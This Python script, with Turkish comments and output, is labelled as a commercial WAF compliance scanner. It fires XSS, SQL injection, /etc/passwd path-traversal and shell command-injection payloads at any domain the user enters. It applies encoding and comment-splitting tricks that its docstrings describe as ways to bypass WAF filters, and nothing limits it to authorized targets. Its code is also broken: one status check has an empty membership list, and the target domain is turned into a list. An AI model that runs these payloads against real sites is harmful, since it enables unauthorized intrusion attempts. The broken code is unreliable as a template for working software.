#!/usr/bin/env python3
# ===================================================================
# PROJE ADI   : MarkOs B2B Advanced WAF Compliance Engine v6.5
# GELİŞTİRİCİ : memetcanwq31-ship-it (BTK Akademi Standartları)
# LİSANS      : MIT Open Source License (Halka Açık / Meşru Proje)
# STATÜ       : B2B SaaS Ticari Sürüm ve Kurumsal Raporlama Altyapısı
# ===================================================================

import os
import sys
import time
import json
import socket
import ssl
import http.client
import urllib.parse
from datetime import datetime
from colorama import Fore, Style, init

# Terminal renk uyumluluğunu başlatıyoruz
init(autoreset=True)

class MarkOsB2BScanner:
    def __init__(self):
        self.version = "6.5.0-B2B-Commercial"
        self.is_running = True
        self.audit_history = []
        
        # B2B denetimlerinde WAF kurallarını test edecek profesyonel imza seti
        self.b2b_payloads = {
            "Cross_Site_Scripting_XSS"  : "<script>confirm(document.domain)</script>",
            "SQL_Injection_Attack"      : "1' UNION SELECT null, version(), current_user--",
            "Local_File_Inclusion_LFI"  : "../../../../etc/passwd",
            "Remote_Code_Execution_RCE" : "; cat /etc/passwd #",
            "OS_Command_Injection"     : "&& id && whoami"
        }

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        self.clear_screen()
        print(f"""{Fore.CYAN}
███╗   ███╗ █████╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗    ██████╗ ██████╗ 
████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝██╔═══██╗██╔════╝    ██╔══██╗╚════██╗
██╔████╔██║███████║██████╔╝█████╔╝ ██║   ██║███████╗    ██████╔╝ █████╔╝
██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗ ██║   ██║╚════██║    ██╔══██╗██╔═══╝ 
██║ ╚═╝ ██║██║  ██║██║  ██╗██║  ██╗╚██████╔╝███████║    ██████╔╝███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝
 ──────────────────────────────────────────────────────────────────────
   [💰] MARKOS B2B COMMERCIAL ENTERPRISE WAF COMPLIANCE SYSTEM
   [⚙️] PORTFOLYO: %100 GERÇEK BAĞLANTI / SAAS LİSANSLAMA ALTYAPISI
 ──────────────────────────────────────────────────────────────────────{Style.RESET_ALL}""")

    # ===================================================================
    # B2B ÖZEL Gelişmiş Şifreleme/Kodlama Mutasyon Motoru (Yasal Testler)
    # ===================================================================

    def mutate_double_encode(self, payload):
        """WAF Regex bypass yeteneğini test etmek için çift katman kodlama."""
        return urllib.parse.quote_plus(urllib.parse.quote_plus(payload))

    def mutate_comment_splitting(self, payload):
        """WAF kelime koruma filtrelerini test etmek için SQL yorum satırı bölmesi."""
        return payload.replace(" ", "/**/")

    def mutate_unicode_obfuscate(self, payload):
        """WAF imza eşleştirme motorlarını test etmek için Unicode maskeleme."""
        return "".join([f"\\u{ord(c):04x}" for c in payload])

    # ===================================================================
    # GERÇEK ZAMANLI KURUMSAL TARAMA VE DEĞERLENDİRME MOTORU
    # ===================================================================

    def run_b2b_compliance_audit(self, domain):
        """Hedef kurumsal sunucu üzerinde B2B uyumluluk fuzzing'i koşturur."""
        self.show_banner()
        print(f"\n{Fore.YELLOW}[*] B2B Kurumsal WAF Uyum Testi Başlatıldı: {Fore.WHITE}{domain}\n")
        time.sleep(1.0)

        context = ssl.create_default_context()
        
        try:
            target_ip = socket.gethostbyname(domain)
            print(f"{Fore.GREEN}[+] Çözümlenen Altyapı IP: {Fore.YELLOW}{target_ip}\n")
        except Exception as e:
            print(f"{Fore.RED}[!] Kritik Hata: Kurumsal DNS Çözümleme Başarısız! -> {e}")
            return

        scan_summary = {
            "target_domain": domain,
            "target_ip": target_ip,
            "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": []
        }

        for attack_name, raw_payload in self.b2b_payloads.items():
            print(f"{Fore.CYAN}── Denetleniyor Siber Kural: {attack_name} ────────────────")
            
            mutations = {
                "Standart URL Girdisi"    : urllib.parse.quote_plus(raw_payload),
                "Çift Katman URL Kodlama" : self.mutate_double_encode(raw_payload),
                "Yorum Satırı Bölmesi"    : urllib.parse.quote_plus(self.mutate_comment_splitting(raw_payload)),
                "Unicode Karakter Maske"  : urllib.parse.quote_plus(self.mutate_unicode_obfuscate(raw_payload))
            }

            for layer_name, payload_mutated in mutations.items():
                print(f"  {Fore.YELLOW}[*] Test Metodu: {layer_name}")
                path = f"/?b2b_test={payload_mutated}"
                
                try:
                    # %100 gerçek, canlı HTTPS bağlantı paketi fırlatılıyor
                    conn = http.client.HTTPSConnection(domain, context=context, timeout=5)
                    conn.request("GET", path, headers={"User-Agent": f"MarkOs-B2B-Scanner/{self.version}"})
                    res = conn.getresponse()
                    res.read()
                    
                    # Kurumsal WAF sistemlerinin meşru engelleme kodları (HTTP 403 / 406)
                    if res.status in:
                        print(f"    {Fore.GREEN}[+] DURUM: GÜVENLİ! Kurumsal WAF Kalkanı İsteyi Bloke Etti (HTTP {res.status})")
                    else:
                        print(f"    {Fore.RED}[!] UYARI (B2B BULGU): Filtre Aşılma Riski! Sunucu Yanıtı: HTTP {res.status}")
                        vuln_entry = {
                            "attack_type": attack_name,
                            "mutation_method": layer_name,
                            "http_status": res.status,
                            "payload_sample": payload_mutated[:40]
                        }
                        scan_summary["vulnerabilities"].append(vuln_entry)
                    conn.close()
                except Exception as e:
                    print(f"    {Fore.GREEN}[+] GÜVENLİ: İstek WAF/IPS tarafından ağ seviyesinde tamamen drop edildi! -> {e}")
                time.sleep(0.2)
            print()

        self.audit_history.append(scan_summary)
        self.generate_b2b_json_report(scan_summary)

    # ===================================================================
    # B2B ÖZEL JSON RAPOR ÜRETİCİ MODÜLÜ (SIEM / SOC UYUMLU)
    # ===================================================================

    def generate_b2b_json_report(self, summary_data):
        """Bulguları kurumsal siber güvenlik ekiplerinin okuyabileceği profesyonel JSON formatına aktarır."""
        filename = f"b2b_compliance_{summary_data['target_domain'].replace('.', '_')}.json"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(summary_data, f, ensure_ascii=False, indent=4)
            print(f"{Fore.GREEN}[+] B2B TİCARİ RAPOR BAŞARIYLA ÜRETİLDİ: {Fore.YELLOW}{filename}")
            print(f"{Fore.CYAN}[i] Bu .json dosyası kurumsal SIEM/SOC panellerine doğrudan entegre edilebilir.")
        except Exception as e:
            print(f"{Fore.RED}[!] Rapor dosyası diske yazılırken bir hata oluştu: {e}")

    def start_framework(self):
        """Ana B2B Menü döngüsü."""
        while self.is_running:
            self.show_banner()
            print(f"\n{Fore.CYAN}── SEÇİLEBİLİR B2B TİCARI SİBER GÜVENLİK MODÜLLERİ ──────────────")
            print(f"  [{Fore.GREEN}1{Fore.WHITE}] Kurumsal Web Sunucu WAF Uyum Testini ve JSON Raporlamayı Başlat")
            print(f"  [{Fore.GREEN}0{Fore.WHITE}] B2B Ticari Motoru Güvenli Kapat / Çıkış (Exit)")
            print(f"{Fore.CYAN}───────────────────────────────────────────────────────────────────")
            
            secim = input(f"{Fore.GREEN}MarkOs_B2B > Seçiminiz: {Style.RESET_ALL}").strip()
            
            if secim == "1":
                print(f"\n{Fore.GREEN}[?] Denetlenecek B2B Kurumsal Domain (Örn: example.com): {Style.RESET_ALL}", end="")
                target = input().strip()
                if target:
                    if "://" in target: target = target.split("://")[-1]
                    if "/" in target: target = target.split("/")
                    self.run_b2b_compliance_audit(target)
                input(f"\n{Fore.GREEN}Ana menüye dönmek için Enter'a basın...")
            elif secim == "0":
                print(f"\n{Fore.RED}[!] MarkOs B2B Ticari Çekirdek Kapatıldı. İyi geceler kankam!"); self.is_running = False
            else:
                print(f"\n{Fore.RED}[!] Geçersiz seçim kankam!"); time.sleep(1.2)

if __name__ == "__main__":
    b2b_engine = MarkOsB2BScanner()
    b2b_engine.start_framework()
